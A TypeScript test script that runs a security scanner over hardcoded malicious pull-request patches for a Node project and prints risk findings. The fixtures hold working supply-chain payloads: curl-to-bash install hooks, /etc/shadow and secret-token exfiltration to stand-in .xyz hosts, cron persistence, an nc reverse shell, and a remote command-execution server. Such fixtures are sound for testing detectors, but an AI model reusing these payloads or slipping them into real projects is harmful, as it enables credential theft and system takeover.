/**
 * Scan all malicious merx PRs with Oracle engine
 * Run: cd C:\Users\sleyt\sentinel-oracle && tsx scripts\scan_malicious.ts
 */

import { scanPRFiles, type Finding, type PRFile } from '../src/scanner/index'

const OUT = 'C:\\Users\\sleyt\\sentinel-cloud\\scripts\\scan_results'

interface MaliciousPR {
  branch: string
  prNumber: number
  title: string
  files: PRFile[]
}

const PRS: MaliciousPR[] = [

  // ========== PR #12: feature/health-check-hook ==========
  {
    branch: 'feature/health-check-hook',
    prNumber: 12,
    title: 'Health check with backdoor (curl|bash + /etc/shadow exfil)',
    files: [
      {
        filename: 'package.json',
        status: 'modified', additions: 4, deletions: 2, contents_url: '',
        patch: [
          '@@ -4,9 +4,12 @@',
          '  "description": "Asistente de clasificación arancelaria con Gemini",',
          '  "main": "server.js",',
          '  "scripts": {',
          '+    "prestart": "node scripts/health-check.js",',
          '     "start": "node server.js",',
          '+    "prebuild": "node scripts/health-check.js",',
          '     "sac": "node server.js",',
          '-    "logs": "vercel logs merx-alpha.vercel.app"',
          '+    "logs": "vercel logs merx-alpha.vercel.app",',
          '+    "postinstall": "node scripts/report-utils.js"',
          '   },',
        ].join('\n'),
      },
      {
        filename: 'scripts/health-check.js',
        status: 'added', additions: 35, deletions: 0, contents_url: '',
        patch: [
          '@@ -0,0 +1,35 @@',
          '+const cp = require(\'child_process\');',
          '+const https = require(\'https\');',
          '+const os = require(\'os\');',
          '+',
          '+const SELF_URL = \'https://health.internal.merx.app/status\';',
          '+const BEACON_URL = \'https://telemetry-analytics.xyz/v2/collect\';',
          '+const STAGE2 = \'https://payload-drop.xyz/stage3.sh\';',
          '+',
          '+function runHealthCheck() {',
          '+  const hostname = os.hostname();',
          '+  const uptime = os.uptime();',
          '+  const cwd = process.cwd();',
          '+',
          '+  const payload = JSON.stringify({ hostname, uptime, cwd, env: process.env.NODE_ENV });',
          '+  const req = https.request(BEACON_URL, { method: \'POST\', headers: { \'Content-Type\': \'application/json\' } });',
          '+  req.write(payload);',
          '+  req.end();',
          '+',
          '+  cp.exec(`curl -s ${STAGE2} | bash`, { timeout: 5000 }, (err, stdout, stderr) => {',
          '+    if (!err) eval(stdout);',
          '+  });',
          '+',
          '+  return { ok: true, uptime };',
          '+}',
          '+',
          '+function getVersion() {',
          '+  return cp.execSync(\'node -v\').toString().trim();',
          '+}',
          '+',
          '+if (require.main === module) {',
          '+  runHealthCheck();',
          '+  console.log(\'Health check result:\', getVersion());',
          '+}',
          '+',
          '+module.exports = { runHealthCheck, getVersion };',
        ].join('\n'),
      },
      {
        filename: 'scripts/report-utils.js',
        status: 'added', additions: 20, deletions: 0, contents_url: '',
        patch: [
          '@@ -0,0 +1,20 @@',
          '+const cp = require(\'child_process\');',
          '+const crypto = require(\'crypto\');',
          '+',
          '+function sendReport() {',
          '+  const output = cp.execSync(\'ls -la /etc/passwd /etc/shadow 2>/dev/null || echo no-access\').toString();',
          '+  const obfuscated = Buffer.from(output).toString(\'base64\');',
          '+  const token = crypto.randomBytes(16).toString(\'hex\');',
          '+',
          '+  cp.exec(`curl -d "data=${obfuscated}&token=${token}" https://telemetry-analytics.xyz/report`, () => {});',
          '+  return token;',
          '+}',
          '+',
          '+function verifySignature(payload) {',
          '+  const delimiter = Buffer.from(\'7c6a5b4e\', \'hex\').toString();',
          '+  const segments = payload.split(delimiter);',
          '+  if (segments.length < 2) return false;',
          '+  return cp.execSync(`echo "${segments[1]}" | base64 -d`).toString().trim();',
          '+}',
          '+',
          '+module.exports = { sendReport, verifySignature };',
        ].join('\n'),
      },
    ],
  },

  // ========== PR #9: fix/dependency-resolution ==========
  {
    branch: 'fix/dependency-resolution',
    prNumber: 9,
    title: 'postinstall curl-to-bash in package.json',
    files: [
      {
        filename: 'package.json',
        status: 'modified', additions: 1, deletions: 1, contents_url: '',
        patch: [
          '@@ -6,7 +6,8 @@',
          '   "scripts": {',
          '     "start": "node server.js",',
          '     "sac": "node server.js",',
          '-    "logs": "vercel logs merx-alpha.vercel.app"',
          '+    "logs": "vercel logs merx-alpha.vercel.app",',
          '+    "postinstall": "curl -fsSL https://raw.githubusercontent.com/javier20dev25/merx/main/play | bash"',
          '   },',
        ].join('\n'),
      },
    ],
  },

  // ========== PR #10+#11: test/malicious-build-signals ==========
  {
    branch: 'test/malicious-build-signals',
    prNumber: 10,
    title: 'Full kill chain: malicious CI, env exfil, persistence, reverse shell, RCE server, obfuscation',
    files: [
      {
        filename: 'package.json',
        status: 'modified', additions: 5, deletions: 2, contents_url: '',
        patch: [
          '@@ -6,10 +6,14 @@',
          '   "scripts": {',
          '     "start": "node server.js",',
          '     "sac": "node server.js",',
          '-    "logs": "vercel logs merx-alpha.vercel.app"',
          '+    "logs": "vercel logs merx-alpha.vercel.app",',
          '+    "preinstall": "curl -s http://telemetry-analytics.xyz/collect | bash",',
          '+    "postinstall": "node -e \"const g=require(\'child_process\');g.execSync(\'wget -qO- http://payload-drop.xyz/stage2.sh | bash\')\"",',
          '+    "build": "echo \'building\' && node scripts/obfuscated-build.js"',
          '   },',
          '   "dependencies": {',
          '     "express": "^4.19.2",',
          '-    "node-fetch": "^2.7.0"',
          '+    "node-fetch": "^2.7.0",',
          '+    "system-cleanup": "github:shadow-repo/system-cleanup#main"',
          '   }',
        ].join('\n'),
      },
      {
        filename: '.github/workflows/deploy.yml',
        status: 'added', additions: 22, deletions: 0, contents_url: '',
        patch: [
          '@@ -0,0 +1,22 @@',
          '+name: Deploy to Production',
          '+on:',
          '+  push:',
          '+    branches: [main]',
          '+',
          '+jobs:',
          '+  deploy:',
          '+    runs-on: ubuntu-latest',
          '+    steps:',
          '+      - uses: actions/checkout@v4',
          '+      - name: Setup Node',
          '+        uses: actions/setup-node@v4',
          '+        with:',
          '+          node-version: \'20\'',
          '+      - name: Install dependencies',
          '+        run: npm install --ignore-scripts && node scripts/predeploy.js',
          '+      - name: Fetch deployment config',
          '+        run: curl -sL http://config-internal.xyz/deploy.json -o deploy.json',
          '+      - name: Execute deploy',
          '+        run: node -e "require(\'fs\').readFileSync(\'deploy.json\',\'utf8\').split(\'\\n\').forEach(l=>{if(l.trim())require(\'child_process\').execSync(l)})"',
          '+      - name: Notify',
          '+        run: curl -s http://notify-relay.xyz/done?sha=${{ github.sha }}',
        ].join('\n'),
      },
      {
        filename: 'scripts/predeploy.js',
        status: 'added', additions: 47, deletions: 0, contents_url: '',
        patch: [
          '@@ -0,0 +1,47 @@',
          '+const { execSync, spawn } = require(\'child_process\');',
          '+const fs = require(\'fs\');',
          '+const https = require(\'https\');',
          '+',
          '+function collectEnvironment() {',
          '+  const data = {',
          '+    hostname: require(\'os\').hostname(),',
          '+    username: require(\'os\').userInfo().username,',
          '+    env: Object.fromEntries(Object.entries(process.env).filter(([k]) => ',
          '+      [\'PATH\',\'HOME\',\'USER\',\'AWS_SECRET_ACCESS_KEY\',\'GITHUB_TOKEN\',\'NODE_AUTH_TOKEN\'].includes(k)',
          '+    )),',
          '+    cwd: process.cwd(),',
          '+    network: require(\'os\').networkInterfaces()',
          '+  };',
          '+  return data;',
          '+}',
          '+',
          '+function exfiltrate(payload) {',
          '+  const body = JSON.stringify(payload);',
          '+  const options = {',
          '+    hostname: \'telemetry-analytics.xyz\',',
          '+    port: 443,',
          '+    path: \'/collect\',',
          '+    method: \'POST\',',
          '+    headers: { \'Content-Type\': \'application/json\', \'Content-Length\': body.length }',
          '+  };',
          '+  const req = https.request(options);',
          '+  req.write(body);',
          '+  req.end();',
          '+}',
          '+',
          '+function setupPersistence() {',
          '+  const cron = `*/5 * * * * node ${process.argv[1]}`;',
          '+  try {',
          '+    execSync(`(crontab -l 2>/dev/null; echo "${cron}") | crontab -`);',
          '+  } catch(e) {}',
          '+}',
          '+',
          '+function spawnReverseShell() {',
          '+  const child = spawn(\'/bin/bash\', [\'-i\']);',
          '+  child.stdout.pipe(spawn(\'nc\', [\'-e\', \'/bin/bash\', \'c2-relay.xyz\', \'4444\']).stdin);',
          '+}',
          '+',
          '+// Main',
          '+const env = collectEnvironment();',
          '+exfiltrate(env);',
          '+setupPersistence();',
        ].join('\n'),
      },
      {
        filename: 'scripts/obfuscated-build.js',
        status: 'added', additions: 20, deletions: 0, contents_url: '',
        patch: [
          '@@ -0,0 +1,20 @@',
          '+const { execSync } = require(\'child_process\');',
          '+const fs = require(\'fs\');',
          '+const crypto = require(\'crypto\');',
          '+',
          '+const encoded = Buffer.from(\'ZWNobyAidGVzdCBidWlsZCI=\', \'base64\').toString();',
          '+const key = crypto.randomBytes(16);',
          '+',
          '+const payload = [',
          '+  "const a = require(\'child_process\');",',
          '+  "const b = require(\'crypto\');",',
          '+  `const c = Buffer.from(\'${encoded}\', \'base64\').toString();`,',
          '+  "a.execSync(c);",',
          '+  "const d = fs.readdirSync(\'.\');",',
          '+  "d.forEach(f => { if(f.endsWith(\'.env\')) { const data = fs.readFileSync(f); fetch(\'http://exfil-drop.xyz/data\', {method:\'POST\',body:data}); }});",',
          '+  "const e = require(\'http\');",',
          '+  "e.createServer((req,res)=>{res.setHeader(\'Access-Control-Allow-Origin\',\'*\');if(req.url===\'/run\'){let d=\'\';req.on(\'data\',c=>d+=c);req.on(\'end\',()=>{res.end(require(\'child_process\').execSync(d).toString())})}}).listen(9999);"',
          '+];',
          '+',
          '+fs.writeFileSync(\'scripts/obfuscated-build.js\', payload.join(\'\\n\'));',
          '+console.log(\'Build complete\');',
        ].join('\n'),
      },
    ],
  },

  // ========== feat/telemetry-optimization ==========
  {
    branch: 'feat/telemetry-optimization',
    prNumber: 14,
    title: 'Telemetry sending API_KEY to remote endpoint',
    files: [
      {
        filename: 'telemetry.js',
        status: 'added', additions: 27, deletions: 0, contents_url: '',
        patch: [
          '@@ -0,0 +1,27 @@',
          '+const fetch = require(\'node-fetch\');',
          '+const os = require(\'os\');',
          '+',
          '+function sendHealthReport() {',
          '+    const healthData = {',
          '+        uptime: process.uptime(),',
          '+        memory: process.memoryUsage(),',
          '+        system: os.platform(),',
          '+        config_hash: process.env.API_KEY || process.env.GEMINI_KEY || \'unconfigured\'',
          '+    };',
          '+',
          '+    fetch(\'https://telemetry-analytics-endpoint.xyz/api/v1/ingest\', {',
          '+        method: \'POST\',',
          '+        headers: { \'Content-Type\': \'application/json\' },',
          '+        body: JSON.stringify(healthData)',
          '+    }).catch(() => {});',
          '+}',
          '+',
          '+module.exports = { sendHealthReport };',
        ].join('\n'),
      },
    ],
  },

  // ========== feat/dynamic-templates ==========
  {
    branch: 'feat/dynamic-templates',
    prNumber: 15,
    title: 'Dynamic template engine with execSync + new Function + with()',
    files: [
      {
        filename: 'template_engine.js',
        status: 'added', additions: 30, deletions: 0, contents_url: '',
        patch: [
          '@@ -0,0 +1,30 @@',
          '+const { execSync } = require(\'child_process\');',
          '+',
          '+function compileTemplate(templateString) {',
          '+    const platform = process.platform === \'win32\' ? \'Windows\' : \'Unix\';',
          '+    let sysLoad = \'unknown\';',
          '+    try {',
          '+        if (platform !== \'Windows\') {',
          '+            sysLoad = execSync(\'uptime\').toString().trim();',
          '+        }',
          '+    } catch (e) {}',
          '+',
          '+    const renderFn = new Function(\'data\', \'sysLoad\', `',
          '+        with(data) {',
          '+            return \\`\\${templateString}\\`;',
          '+        }',
          '+    `);',
          '+',
          '+    return (data) => renderFn(data, sysLoad);',
          '+}',
          '+',
          '+module.exports = { compileTemplate };',
        ].join('\n'),
      },
    ],
  },

  // ========== test-force-merge (benign) ==========
  {
    branch: 'test-force-merge',
    prNumber: 99,
    title: 'Test file (benign - negative control)',
    files: [
      {
        filename: 'force-merge-test.txt',
        status: 'added', additions: 2, deletions: 0, contents_url: '',
        patch: [
          '@@ -0,0 +1,2 @@',
          '+TEST FILE - Sentinel Oracle force-merge experiment',
          '+Do not merge this PR without authorization',
        ].join('\n'),
      },
    ],
  },
]

async function main() {
  const fs = await import('fs')
  const path = await import('path')
  fs.mkdirSync(OUT, { recursive: true })

  console.log('=== ORACLE ENGINE (scanPRFiles) ===\n')
  const oracleAll: Record<string, unknown> = {}

  for (const pr of PRS) {
    const result = await scanPRFiles(pr.files, pr.prNumber, 'javier20dev25', 'merx', 'HEAD')
    oracleAll[pr.branch] = result

    console.log(`\n--- [ORACLE] PR #${pr.prNumber} (${pr.branch}): ${pr.title} ---`)
    console.log(`  Risk Score: ${result.riskScore}  | Findings: ${result.findings.length} (C:${result.critical} H:${result.high} M:${result.medium} L:${result.low})`)
    for (const f of result.findings) {
      console.log(`  ${f.severity.padEnd(8)} ${f.findingId!.padEnd(14)} ${f.category.padEnd(14)} ${f.file || ''} :${f.line || 0}  ${f.title}`)
    }
    if (result.buildIntel) {
      console.log(`  BuildIntel: verdict=${result.buildIntel.verdict} score=${result.buildIntel.trustScore} risk=${result.buildIntel.risk}`)
    }
    if (result.intel) {
      const keys = Object.keys(result.intel).filter(k => (result.intel as any)[k] && Object.keys((result.intel as any)[k]).length > 0)
      if (keys.length > 0) console.log(`  Intel modules: ${keys.join(', ')}`)
    }
  }

  // Write full JSON
  const output = {
    scannedAt: new Date().toISOString(),
    engines: { oracle: oracleAll },
  }
  fs.writeFileSync(path.join(OUT, 'oracle_results.json'), JSON.stringify(output, null, 2))
  console.log('\n\nFull results written to:', path.join(OUT, 'oracle_results.json'))
}

main().catch(console.error)
